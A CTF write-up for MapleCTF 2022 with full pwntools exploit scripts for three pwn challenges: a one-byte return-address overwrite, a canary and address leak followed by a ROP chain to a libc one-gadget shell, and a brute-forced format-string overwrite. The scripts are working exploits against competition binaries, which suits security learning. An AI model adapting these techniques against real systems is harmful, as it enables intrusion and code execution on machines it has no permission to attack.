---
title: MapleCTF 2022
date: 2022-08-27 00:14:18
category: CTF Writeup
tags:
    - MapleCTF
---

## warmup1

A simple 1 byte buffer overflow to overwrite the first byte of the return address to main and jump to `win` function. 

EXP:

```python
from pwn import *


context.arch = "amd64"
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

HOST = "warmup1.ctf.maplebacon.org"
PORT = 1337
LOCAL = False
elf = ELF("./warmup1")
libc = elf.libc

context.log_level = "info"
p = remote(HOST, PORT)

# Exploit starts here
padding = 24
payload = b'A' * padding + b"\x19"
p.send(payload)
print(p.readall(timeout=1))
```

## warmup2

Very similar to `warmup1`, but with canary, ASLR all enabled. However, it provides us two `printf` function which can be used to leak canary and base addresses. 

First to leak out canary and stack address, then repeat the function by overwrite first byte of return address (actually we can repea arbitrary times to get everything we want). Then construct ROP chain to leak libc address, finally attack by using the one-gadget. 

EXP:

```python
from pwn import *


context.arch = "amd64"
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=True)
ru = lambda x: p.recvuntil(x, drop=True)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)

HOST = "warmup2.ctf.maplebacon.org"
PORT = 1337
LOCAL = False
elf = ELF("./warmup2")
libc = elf.libc

context.log_level = "info"
p = remote(HOST, PORT)

# Exploit starts here
padding = 0x108

# leak address
sa("?", b"A" * (padding + 1))
rl()
msg = rl()
canary = u64(b'\x00' + msg[0x10f:0x10f + 7])
info("CANARY LEAKED" + hex(canary))
stack_addr = u64(msg[0x116:-2].ljust(8, b'\x00'))
info("STACK_ADDR LEAKED" + hex(stack_addr))

sa("?", b"B" * padding + p64(canary) + p64(stack_addr) + b'\xd8')

sa("?", b"C" * (padding + 0x10))
ru("Hello ")
msg = rl()
return_addr = u64(msg[padding + 0x10:-2].ljust(8, b'\x00'))
elf.address = return_addr - 0x12e2
info("RETURN_ADDR LEAKED: " + hex(return_addr))
info("ELF_BASE CALCULATED: " + hex(elf.address))

# start exploit
pop_rdi = elf.address + 0x1353
payload = flat(
        b"D" * padding,
        canary,
        b"D" * 8,
        pop_rdi,
        elf.got["puts"],
        elf.plt["puts"],
        elf.symbols[b'vuln'],
        )
sa("?", payload)
ru("Wow, I'm ")
rl()
msg = rl()
putsaddr=u64(msg[:-1].ljust(8,b'\x00'))
info('puts->'+hex(putsaddr))
libc.address = putsaddr - libc.symbols['puts']

payload = flat(
        b"E" * padding,
        canary,
        b"E" * 8,
        libc.address + 0xe3b01, # one gadget
        )
sa("?", payload)
sl("DONE")

p.interactive()
```

## printf (learned from WP)

The program takes in the user input and then `printf` out. Classic format string challenge. However, I stuck at reruning the `printf` function to overwrite the return address. I thought of overwrite the chain pointers and get control, but failed because one `printf` don't allow to overwrite two places (return address and a pointer) 

After looking at the WP in the [reference](#reference) section, they said all the secrets are lie in the [source code](https://elixir.bootlin.com/glibc/glibc-2.31/source/stdio-common/vfprintf-internal.c#L1748). 

The source code tell us that when it encounters the position character, `$`, it will store the value of positions into an internal buffer called `args_value`. So when doing the overwrite by using `%n`, the value was fatched is the initial value instead of the changed value. To get rid of this, we need to construct payload without the first `$` character. Instead, we may use `%c` or `%p` to get to the right poisition on stack.

That's all the information we can get, however, we still can't know the stack address to do the overwrite. That's where the bruteforce comes in (but tipically, CTF will not have bruteforce challenges to prevent DDoS the platform). 

EXP:

```python
from pwn import *


context.arch = "amd64"
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=True)
ru = lambda x: p.recvuntil(x, drop=True)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)

HOST = "printf.ctf.maplebacon.org"
PORT = 1337
LOCAL = False
elf = ELF("./printf")
libc = elf.libc

while True:
    context.log_level = "info"
    if LOCAL:
        p = process(elf.file.name)
    else:
        context.log_level = "info"
        p = remote(HOST, PORT)

    # Exploit starts here
    # registers part
    payload = "%c" * 3
    size = 3
    payload += "%p" # bss (program addr)
    size += 14
    payload += "%c"
    size += 1

    # stack part
    payload += "%p" # stack addr
    size += 14
    payload += "%c" * 6
    size += 6
    payload += "%p" # libc_start_main (libc addr)
    size += 14
    payload += "%" + str(0x7348 - size) + "c"
    payload += "%hn%" + str(0xed - 0x48) + "c%43$hhn"
    # payload += "%" + str(0x178 - 0xed) + "%6$hhn" # prepare pointer to overwrite the libc_start_main
    sl(payload)

    ru("0x")
    base_addr = int(r(12), 16) - 0x4040
    ru("0x")
    stack_addr = int(r(12), 16)
    ru("0x")
    libc_addr = int(r(12), 16) - 0x24083
    print(hex(base_addr), hex(stack_addr), hex(libc_addr))

    if (stack_addr & 0xffff) != 0x7350:
        p.close()
        continue

    print("!!!!!!!!!!bruteforce success!!!!!!!!!!!!")
    # if LOCAL:
    #     gdb.attach(p, "b *go + 0x36\nc")

    # start exploit
    one_gadget = libc_addr + 0xe3b01
    low_word = one_gadget & 0xffff 
    low_word2 = (one_gadget & 0xffff0000) >> 16

    # setup the pointer for overwrite the return addr of main
    payload2 = "%" + str(0x78) + "c%6$hhn"
    payload2 += "%" + str(0xed - 0x78) + "c%43$hhn"
    sl(payload2)

    # overwrite part of the address
    payload2 = "%" + str(0x7a) + "c%6$hhn"
    payload2 += "%" + str(0xed - 0x7a) + "c%43$hhn"
    payload2 += "%" + str(low_word - 0xed) + "c%8$hn"
    sl(payload2)

    # finish up and get shell
    payload2 = "%" + str(low_word2) + "c%8$hn"
    sl(payload2)

    p.interactive()
```

## Reference

http://blog.redrocket.club/2020/12/23/HXPCTF-Still_Printf/
https://github.com/Mem2019/Mem2019.github.io/blob/master/codes/hxp2020-still-printf.py
